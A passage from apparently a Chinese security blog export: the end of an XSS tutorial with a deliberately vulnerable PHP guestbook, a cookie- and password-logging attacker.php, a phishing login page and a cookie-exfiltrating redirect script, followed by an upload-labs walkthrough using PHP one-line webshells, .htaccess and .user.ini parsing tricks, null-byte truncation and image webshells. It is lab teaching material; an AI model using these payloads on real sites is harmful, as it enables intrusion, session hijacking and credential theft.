/></script>\n````\n\n发送给其他用户进行访问，并输入自己的名字（安全等级为low）\n\n![image-20250518163738310](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181637357.png)\n\n先登录另一个用户\n\nsmithy/password\n\n设置安全等级为low\n\n![image-20250518164259315](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181642345.png)\n\nxss_r目录下面多了一个cookie.txt文件\n\n![image-20250518164352955](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181643989.png)\n\n成功得到了另一个用户的cookie值\n\n````\nIP: ::1Date: 2025-05-18 4:40:28 Cookie:PHPSESSID=qju48o1h63s6n78olt15h1o8sb; security=low\nIP: ::1Date: 2025-05-18 4:41:22 Cookie:PHPSESSID=qju48o1h63s6n78olt15h1o8sb; security=low\n````\n\n拿到了其他用户的cookie值那么怎么登陆到其他用户呢？\n\n首先进入到靶场的登陆页面\n\n![image-20250518164619598](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505181646644.png)\n\n更改cookie值刷新就可以进入cookie值对应的用户。\n\n\n\n### 2.劫持流量实现恶意跳转\n\n网页中想办法插入一句像这样的语句： `<script>window.location.href=\"http://www.baidu.com\";</script>`那么所访问的网站就会被跳转到百度的首页\n\n本地实践\n\n##### 环境搭建\n\n![image-20250527212821916](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505272128996.png)\n\n根目录下面创建如下的文件\n\nconfig.php进行数据库配置或者直接创建数据库，并创建表\n\n![image-20250527213027883](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505272130919.png)\n\nindex.php是有漏洞的留言板\n\n````php\n<?php\ninclude 'config.php';\n\n// 处理留言提交\nif ($_SERVER[\"REQUEST_METHOD\"] == \"POST\" && !empty($_POST['message'])) {\n    $message = $conn->real_escape_string($_POST['message']);\n    $sql = \"INSERT INTO messages (content) VALUES ('$message')\";\n\n    if (!$conn->query($sql)) {\n        die(\"留言提交失败: \" . $conn->error);\n    }\n\n    // 防止重复提交\n    header(\"Location: \".$_SERVER['PHP_SELF']);\n    exit;\n}\n\n// 获取留言\n$result = $conn->query(\"SELECT content FROM messages ORDER BY id DESC\");\n?>\n<!DOCTYPE html>\n<html>\n<head>\n    <title>留言板</title>\n    <style>\n        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }\n        .message { margin: 15px 0; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }\n        textarea { width: 100%; padding: 10px; margin-bottom: 10px; }\n    </style>\n</head>\n<body>\n    <h1>留言板系统</h1>\n\n    <form method=\"POST\">\n        <textarea name=\"message\" rows=\"5\" required placeholder=\"请输入留言内容...\"></textarea><br>\n        <button type=\"submit\">提交留言</button>\n    </form>\n\n    <hr>\n\n    <h2>留言列表</h2>\n    <?php if ($result->num_rows > 0): ?>\n        <?php while($row = $result->fetch_assoc()): ?>\n            <div class=\"message\"><?= $row['content'] ?></div>  <!-- 故意保留XSS漏洞 -->\n        <?php endwhile; ?>\n    <?php else: ?>\n        <p>暂无留言</p>\n    <?php endif; ?>\n</body>\n</html>\n````\n\n攻击者收集信息的页面(attacker.php)\n\n````php\n<?php\n// 记录访问信息\n$log = date('Y-m-d H:i:s').\" | IP: \".$_SERVER['REMOTE_ADDR'].\"\\n\";\n$log .= \"User-Agent: \".$_SERVER['HTTP_USER_AGENT'].\"\\n\";\n$log .= \"Referer: \".(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '无').\"\\n\";\n$log .= \"Cookies: \".print_r($_COOKIE, true).\"\\n\";\n$log .= \"GET参数: \".print_r($_GET, true).\"\\n\";\n$log .= \"POST参数: \".print_r($_POST, true).\"\\n\";\n$log .= str_repeat(\"-\", 50).\"\\n\";\n\nfile_put_contents('attack_log.txt', $log, FILE_APPEND);\n\n// 重定向到钓鱼页面\nheader(\"Location: phishing/index.html\");\nexit;\n?>\n````\n\n钓鱼网站的页面\n\n````\n<!DOCTYPE html>\n<html>\n<head>\n    <title>系统安全验证</title>\n    <style>\n        body { font-family: Arial, sans-serif; max-width: 500px; margin: 50px auto; padding: 20px; }\n        .login-box { border: 1px solid #ddd; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }\n        input { width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }\n        button { background-color: #4CAF50; color: white; padding: 12px 20px; border: none; border-radius: 4px; cursor: pointer; width: 100%; }\n        .warning { color: red; font-weight: bold; margin-bottom: 20px; }\n    </style>\n</head>\n<body>\n    <div class=\"login-box\">\n        <h2>系统安全验证</h2>\n        <p class=\"warning\">⚠️ 您的账户存在异常访问，请重新登录验证身份</p>\n\n        <form action=\"../attacker.php\" method=\"POST\">\n            <label for=\"username\">用户名:</label>\n            <input type=\"text\" id=\"username\" name=\"username\" required>\n\n            <label for=\"password\">密码:</label>\n            <input type=\"password\" id=\"password\" name=\"password\" required>\n\n            <button type=\"submit\">立即验证</button>\n        </form>\n\n        <p style=\"margin-top: 20px; font-size: 12px; color: #777;\">\n            如果您遇到任何问题，请联系系统管理员。\n        </p>\n    </div>\n</body>\n</html>\n````\n\n##### 漏洞实践\n\n访问留言板\n\n````\nhttp://localhost/xss-demo/index.php\n````\n\n输入下面的代码当作留言，提交留言\n\n````\n<script>\nwindow.location.href = 'attacker.php?from=xss&cookie=' + encodeURIComponent(document.cookie);\n</script>\n````\n\n再重新访问留言板\n\n页面跳转到下面的页面即钓鱼网站的页面，即假装网页的登陆失效要求用户重新登陆\n\n用户只要输入并且进验证的话就会将账号和密码等信息收集储存起来\n\n![image-20250528001500039](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505280015092.png)\n\n![image-20250528001529126](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505280015162.png)\n\n##### **恶意脚本解释**\n\n````\n<script>\nwindow.location.href = 'attacker.php?from=xss&cookie=' + encodeURIComponent(document.cookie);\n</script>\n````\n\n**首先是`window.location.href` 操作**\n\n作用是修改当前的窗口的url，跳转到新的页面(使用户在不知道的情况下面被群迫进行了网页的重定向)\n\n**attacker.php**\n\n由攻击者指定的恶意脚本，同域名下面的恶意文件，本地测试可以直接写，实战的话就得利用已有的文件上传漏洞。\n\n**参数from =xss**\n\n只是简单地标识攻击的方式\n\n**cookie=` + `encodeURIComponent(document.cookie)**\n\n**`document.cookie`**\n\n获取当前网站的所有cookie\n\n**`encodeURIComponent()`**\n\n对特殊字符进行URL编码，确保数据完整传输\n\n##### 攻击过程图示\n\n![image-20250528004000823](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505280040882.png)\n\n\n"},{"title":"upload-labs全详解","url":"/2025/05/12/upload-labs全详解/","content":"# upload-1（扩展名）\n\n直接上传一句话木马\n\n````php\n<?php @eval($_POST['cmd']);?>\n````\n\n![image-20250506162226800](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505061622862.png)\n\n可知被`js`拦截了\n\n这里存在两种解法\n\n一.直接在浏览器中禁用`js`\n\n二.将文件名更改为`cj.png`，上传抓包，在重放中将文件后缀名更改为`cj.php`,再进行发包。\n\n返回靶场的页面，复制上传的文件的链接，打开蚁剑，输入上面复制的链接打开蚁剑，粘贴网址，输入密码\n\n![image-20250506163758185](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505061637236.png)\n\n核心的源码如下：\n\n````\nvar allow_ext = \".jpg|.png|.gif\";\n    //提取上传文件的类型\n    var ext_name = file.substring(file.lastIndexOf(\".\"));\n    //判断上传文件类型是否允许上传\n    if (allow_ext.indexOf(ext_name + \"|\") == -1) {\n        var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name;\n        alert(errMsg);\n        return false;\n````\n\n源码的作用是截取点号之后的文件名，精确匹配上面的允许上传的文件名。\n\n**能进行绕过的原因是：**\n\n这段源码仅仅通过`js`前端检查了文件名的后缀，而不检查真实的文件类型（如通过文件头Magic Number或者是MINE Type判断），所以只需要抓包使`js`的前端验证通过就可以\n\n# upload-2（mime类型校验）\n\n上传一个一句话木马的`php`文件\n\n![image-20250506165212363](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505061652411.png)\n\n同样上传`php`一句话的同时进行抓包拦截，修改请求包的Content-Type为图片类型（`image/jpeg`）即可\n\n![image-20250506165616523](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505061656556.png)\n\n放行数据包，重复上面的操作\n\n核心源码如下：\n\n````\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '文件类型不正确，请重新上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';\n    }\n}\n````\n\n根据源码判断，这里的漏洞类型是**MIME 类型校验漏洞**，攻击者可以通过抓包修改 `Content-Type` 来绕过检查。\n\n````\nif (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif'))\n````\n\n上面的代码仅仅检查的是来自HTTP请求头的Content-Type的值，同样没有对文件的真实类型进行判断。\n\n# upload-3（Apache服务器特性）\n\n将文件后缀名更改为`php3，php5，phtml`可以绕过。\n\n核心源码如下：\n\n````\n$deny_ext = array('.asp','.aspx','.php','.jsp');\n $file_name = trim($_FILES['upload_file']['name']);\n $file_name = deldot($file_name);//删除文件名末尾的点\n$file_ext = strrchr($file_name, '.');\n $file_ext = strtolower($file_ext); //转换为小写\n$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n $file_ext = trim($file_ext); //收尾去空\n````\n\n上面进行了一系列的过滤，防止通过点号，空格，大小写等方法绕过达到上传恶意文件的作用。但是这里并没有过滤`php3，php5，phtml`这些文件后缀名，**能这样绕过的条件：**\n\nApache服务器支持解析 `.php3 .php5 .phtml`后缀名的文件，但是需要在Apache的配置文件（`httpd.conf`或者是`apache2.conf`）中添加\n\n````\nAddType application/x-httpd-php .php .phtml .php3 .php5\n````\n\n这样这些文件扩展名就能够被当作`php`脚本处理了，当然这里还有一个条件是靶场的搭建利用到了Apache服务器。\n\n# upload-4(`.staccess`文件)\n\n核心源码\n\n````\n$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //收尾去空\n````\n\n上面的源码过滤了许多文件的扩展名，包括过滤了点号，空格，大小写的绕过方法，这里可以看到文件后缀名.htaccess没有过滤掉\n\n````\n.htaccess是一个纯文本文件，其中储存着Apache相关的命令\n.htaccess主要的作用：URL重写，404页面自定义，改变文件的扩展名，允许或者阻止特定的用户或者目录\n进行访问。\n.htaccess只针对当前目录才会起作用。\n.haaccess改变文件扩展名的用法：\n<FilesMatch \"4.png\">\n SetHandler application/x-httpd-php\n </FilesMatch>\n（如果当前目录下面由名字为4.png的文件就会被解析为.php的文件）\n````\n\n下面是我创建的.staccess文件的内容\n\n````\n<FilesMatch \"\\.jpg\">\n SetHandler application/x-httpd-php\n </FilesMatch>\n````\n\n上面这串代码的作用是：\n通过 `SetHandler` 指令，**劫持 `.jpg` 文件的处理方式**，让它们被 `PHP` 引擎解析。**强制让所有 `.jpg` 文件被 Apache 当作 `PHP` 脚本解析并执行**。\n\n接着就将存储一句话木马的`php`的文件扩展名更改为`.jpg`\n\n![image-20250507155953858](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505071600961.png)\n\n先上传`.staccess`文件接着上传`cj.jpg`文件，复制上传的图片文件的路径，连接蚁剑\n\n![image-20250507160315872](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505071603909.png)\n\n\n\n# upload-5(`.user.ini`文件)\n\n观察第五关的关键源码\n\n````\narray(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".j\nHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\")\n````\n\n发现对比上一关，这里.htaccess文件也被拉入了黑名单，但是没有禁用.ini文件。 php.ini 是 php的配置文件，.user.ini（相当于一个用户自己定义的php.ini文件） 中的字段也会被 php  视为配置文件来处理，从而导致 php 的文件解析漏洞。\n\n要触发**`.user.ini`文件的内容满足下面的条件**\n\n````\n服务器脚本语言为PHP\n服务器使用CGI／FastCGI模式 （两种通用网关接口，用于HTTP服务器与其他机器的程序服务通信交流）\n上传目录下要有可执行的php文件\n````\n\n靶场的Apache服务器满足上面的两种条件\n\n接下来创建一个`.user.ini`文件上传，**文件的内容如下：**\n\n````\nauto_prepend_file=cj.jpg\n作用：\n表示在每个php脚本执行之前，php会加载并且执行cj.jpg文件，即使是一个图片文件 php也会尝试将\n其作为php代码解析(如果文件的内容包含有效的php代码的话)\n````\n\n接下来直接上传`cj.jpg`文件，等待五分钟之后右键图片复制连接蚁剑\n\n![image-20250507173908190](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505071739252.png)\n\n# upload-6(大小写绕过)\n\n源码如下：\n\n````\n$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n````\n\n可以看到源码中不存在**`strtolower()`**函数，这个函数的作用是将字符串中的所有字符串转化为小写。\n\n所以这里可以通过大小写绕过，及那个文件后缀名更改为`cj.Php`\n\n**能通过大小写绕过的原理：**\n\n在Windows系统上面，文件名默认不区分大小写。\n\n# upload-7(空格绕过)\n\n````\n$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = $_FILES['upload_file']['name'];\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n````\n\n这里没有**trim()**函数，这个函数的作用是**去除字符串首尾的空白字符或其他指定字符**\n\n直接上传`php`文件使用`yakit`进行拦截抓包\n\n![image-20250507201506814](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505072015886.png)\n\n![image-20250507201517303](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505072015333.png)\n\n在文件名后面加上空格发包，响应包中找到上传的图片的链接\n\n![image-20250507201742360](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505072017395.png)\n\n使用蚁剑进行连接\n\n![image-20250507201836809](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505072018857.png)\n\n**绕过的原理：**\n\n在Windows系统中默认自动忽略文件名末尾的空格，cj.php和cj.php 会被视为同一文件。\n\n# upload-8(点号绕过)\n\n关键源码如下：\n\n````\n$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n````\n\n`strrchr()`函数的作用是**查找字符串中最后一次出现某个字符的位置，并返回从该字符到字符串末尾的子串**。\n\n这里利用`strrchr()`函数的特性进行绕过，**当文件包含多个点的时候，`strrchr()`返回的是最后一个点之后的内容（如果最后一个点为空就返回“.”）**\n\n上传正常的`php`一句话木马的文件，抓包，在请求包文件的扩展名后面加上一个点号，再发包就可以连接蚁剑。\n\n![image-20250508001920991](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505080019092.png)\n\n**能够绕过的原理：**\n\nWindows存储文件的时候会自动删除文件末尾的点号，cj.php.实际保存为cj.php\n\n# upload-9(::DATA绕过)\n\n关键源码如下：\n\n````\n$deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = trim($file_ext); //首尾去空\n````\n\n观察源码可知没有对::DATA进行处理，可以使用::DATA进行绕过\n\n````\n可以绕过的原理：\nphp在Windows的时候如果在文件名之后加上::DATA会将之后的数据当作文件流进行处理，不会再检查文件的后缀名，而且可以保持::DATA之前的文件名\n````\n\n上传文件使用yakit进行拦截，将png的文件后缀名更改为.php:DATA然后放行可以发现文件上传成功\n\n![image-20250508003650268](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505080036317.png)\n\n连接蚁剑即可\n\n![image-20250508003705204](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505080037248.png)\n\n# upload-10（与第6关相同）\n\n\n\n# upload-11(双写绕过)\n\n关键源码如下：\n\n````\n$deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\",\"ini\");\n\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = str_ireplace($deny_ext,\"\", $file_name);\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = UPLOAD_PATH.'/'.$file_name;\n````\n\n查看本关的提示可以发现\n\n![image-20250508105529364](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081055527.png)\n\n对应源码的关键函数是：`str_ireplace($deny_ext,\"\", $file_name)`\n\n它是拿匹配字符串去挨个的对等待匹配字符串进行对比，当匹配上了就替换并返回。所以这里可以构造文件`cj.pphphp`当匹配第一个P的时候不满足，当匹配第二个p的时候满足并且会将`php`替换为空，接下来不会继续匹配了。剩下的P和hp就会组成`php`了\n\n**关键：**函数只进行一次替换，不会递归检查替换之后的结果\n\n\n\n**接下来就是白名单绕过**\n\n# upload-12(%00截断)\n\n查看关键源码\n\n````\next_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n````\n\n这里是白名单，只允许上传`'jpg','png','gif'`这三种后缀名\n\n````\n$img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n````\n\n由这段代码可知，文件上传的路径可控，由get上传的参数save_path在`url`完全可控。\n\n再满足条件php的版本低于5.3就可以使用%00绕过。\n\n````\n什么是%00截断漏洞\n在php处理文件名或者是路径的时候，如果遇到了URL编码的%00，就会将\n它解释为一个空字节（也就是ascii值为0）在php5.3之前，php会将这个空字节转化为\\000，而php5.3之前文件名如果出现\\000，会导致文件名被截断，只保留%00之前的内容。\n````\n\n上传的一句话木马的内容\n\n````\n<?php $GET[0]($_GET[1]);?>\n通过get参数0接受要执行的函数名\n通过get参数1接受该函数的参数\n从而动态执行任意的php函数\n````\n\n\n\n![image-20250508155908605](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081559666.png)\n\n在请求头加上文件名%00进行截断，然后发包\n\n![image-20250508160101315](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081601354.png)\n\n可以通过一句话木马执行任意的函数\n\n````\nhttp://localhost/upload-labs-master/upload/yc.php?0=phpinfo\n````\n\n![image-20250508163925546](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081639602.png)\n\n\n\n# upload-13(post传参的%00截断)\n\n关键如下：\n\n````\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n````\n\n这一关使用的是POST传参，由于POST传参不会对%00进行编码，所以我们需要在文件名的后面加上一个占位符，再将占位符的十六 进制数更改为00，这样空字节就出来了，再移动字节的时候就会出现%00截断。\n\n上传php文件抓包\n\n![image-20250508164355554](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081643611.png)\n\n在请求包的upload后面加上`yc.phpa`再在hex视图将a对应的十六进制的数更改为00，这样就可以得到一个空字节，再次发包上传成功\n\n**截断的原理**\n\n低版本的`php`遇到00(空字节)会认为字符串结束，实际保存的路径姐变成了`/upload/yc.php`，后面的a被忽略了。\n\n# upload-14(图片马+文件包含)\n\n源码：\n\n````\nfunction getReailFileType($filename){\n    $file = fopen($filename, \"rb\");\n    $bin = fread($file, 2); //只读2字节\n    fclose($file);\n    $strInfo = @unpack(\"C2chars\", $bin);\n    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);\n    $fileType = '';\n    switch($typeCode){\n        case 255216:\n            $fileType = 'jpg';\n            break;\n        case 13780:\n            $fileType = 'png';\n            break;\n        case 7173:\n            $fileType = 'gif';\n            break;\n        default:\n            $fileType = 'unknown';\n        }\n        return $fileType;\n}\n````\n\n有源码可知这一关通过直接读取文件头标识来检测文件的真实类型，所以常规的绕过方法不可用。\n\n这里使用图片马+文件包含绕过\n\n````\n图片马的制作：\n在对应的文件夹下面打开cmd命令，执行下面的命令\ncopy login.jpg/b+cj.php/a cj.jpg(login.jpg是任意的图片，cj.php是一句话木马，test.jpg是\n生成的一句话木马)\n````\n\n上传生成的图片马\n\n![image-20250508165915516](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081659600.png)\n\n点击上面的文件包含，得到\n\n![image-20250508165956809](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081659848.png)\n\n所以这里使用了file作为参数进行文件包含\n\n````\nhttp://10.18.208.98/upload-labs-master/include.php?\n file=upload/6720250321175356.jpg\n````\n\n![image-20250508170441017](https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081704060.png)\n\n# upload-15(图片马+文件包含)\n\n```php\n$info = getimagesize($filename);\n```\n\n这个函数是 `PHP` 中用于检测图像文件信息的核心函数\n\n与14相同的操作\n\n# upload-16(图片马+文件包含)\n\n关键源码\n\n````php\nfunction isImage($filename){\n    //需要开启php_exif模块\n    $image_type = exif_imagetype($filename);\n    switch ($image_type) {\n        case IMAGETYPE_GIF:\n            return \"gif\";\n            break;\n        case IMAGETYPE_JPEG:\n            return \"jpg\";\n            break;\n        case IMAGETYPE_PNG:\n            return \"png\";\n            break;\n        default:\n            return false;\n            break;\n    }\n}\n````\n\n`exif_imagetype()`函数读取文件头部的魔数(magic number)判断图像类型\n\n与14，15基本相同，只需要在小皮上面打开一个扩展`php_exif` 